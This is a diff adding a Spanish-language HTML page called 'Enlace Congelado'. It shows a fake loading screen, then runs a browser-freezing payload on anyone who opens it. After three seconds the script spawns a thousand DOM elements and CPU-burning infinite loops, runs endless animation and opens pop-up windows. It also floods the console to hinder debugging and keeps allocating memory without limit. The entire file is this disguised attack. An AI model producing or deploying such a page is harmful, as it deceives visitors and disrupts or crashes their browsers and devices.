@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enlace Congelado</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+        .container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .message {
+            font-size: 24px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .progress {
+            width: 80%;
+            height: 30px;
+            background-color: #333;
+            border-radius: 15px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        .progress-bar {
+            height: 100%;
+            background-color: #4CAF50;
+            width: 0%;
+            animation: loading 3s infinite;
+        }
+        @keyframes loading {
+            0% { width: 0%; }
+            50% { width: 100%; }
+            100% { width: 0%; }
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="main-container">
+        <div class="message">Cargando contenido...</div>
+        <div class="progress">
+            <div class="progress-bar"></div>
+        </div>
+        <div class="message">Por favor, espera un momento.</div>
+    </div>
+
+    <div id="freeze-container" class="hidden"></div>
+
+    <script>
+        // Mostrar la pantalla de "cargando" por unos segundos
+        setTimeout(function() {
+            document.getElementById('main-container').classList.add('hidden');
+            document.getElementById('freeze-container').classList.remove('hidden');
+            
+            // Iniciar el proceso de congelación
+            startFreeze();
+        }, 3000);
+
+        function startFreeze() {
+            // Crear elementos visuales que consuman recursos
+            const freezeContainer = document.getElementById('freeze-container');
+            
+            // Añadir muchos elementos DOM
+            for (let i = 0; i < 1000; i++) {
+                const div = document.createElement('div');
+                div.style.position = 'absolute';
+                div.style.width = Math.random() * 100 + 'px';
+                div.style.height = Math.random() * 100 + 'px';
+                div.style.backgroundColor = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
+                div.style.left = Math.random() * window.innerWidth + 'px';
+                div.style.top = Math.random() * window.innerHeight + 'px';
+                div.style.opacity = Math.random();
+                div.style.zIndex = Math.floor(Math.random() * 1000);
+                freezeContainer.appendChild(div);
+            }
+            
+            // Iniciar bucles infinitos que consuman CPU
+            function infiniteLoop() {
+                while (true) {
+                    // Operaciones matemáticas intensivas
+                    Math.sqrt(Math.random() * 1000000);
+                    Math.sin(Math.random() * 100);
+                    Math.cos(Math.random() * 100);
+                    Math.pow(Math.random(), Math.random());
+                }
+            }
+            
+            // Ejecutar múltiples bucles en paralelo
+            for (let i = 0; i < navigator.hardwareConcurrency || 4; i++) {
+                setTimeout(infiniteLoop, 100 * i);
+            }
+            
+            // Crear bucles de animación infinitos
+            function animate() {
+                requestAnimationFrame(animate);
+                
+                // Mover todos los elementos aleatoriamente
+                const elements = freezeContainer.children;
+                for (let i = 0; i < elements.length; i++) {
+                    const element = elements[i];
+                    element.style.left = (parseFloat(element.style.left) + Math.random() * 10 - 5) + 'px';
+                    element.style.top = (parseFloat(element.style.top) + Math.random() * 10 - 5) + 'px';
+                    element.style.backgroundColor = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
+                }
+            }
+            
+            animate();
+            
+            // Intentar abrir múltiples ventanas emergentes (aunque los navegadores modernos las bloquearán)
+            for (let i = 0; i < 10; i++) {
+                try {
+                    window.open('', '_blank', 'width=100,height=100');
+                } catch (e) {
+                    // Ignorar errores de bloqueo de pop-ups
+                }
+            }
+            
+            // Llenar la consola con mensajes para dificultar la depuración
+            setInterval(function() {
+                console.log('Congelando navegador... ' + new Date().toLocaleTimeString());
+                for (let i = 0; i < 100; i++) {
+                    console.log(Math.random().toString(36).substring(2, 15));
+                }
+            }, 100);
+            
+            // Intentar usar memoria del navegador
+            let memoryHog = [];
+            setInterval(function() {
+                for (let i = 0; i < 1000; i++) {
+                    memoryHog.push(new Array(1000).fill(Math.random()));
+                }
+            }, 100);
+        }
+    </script>
+</body>
+</html>
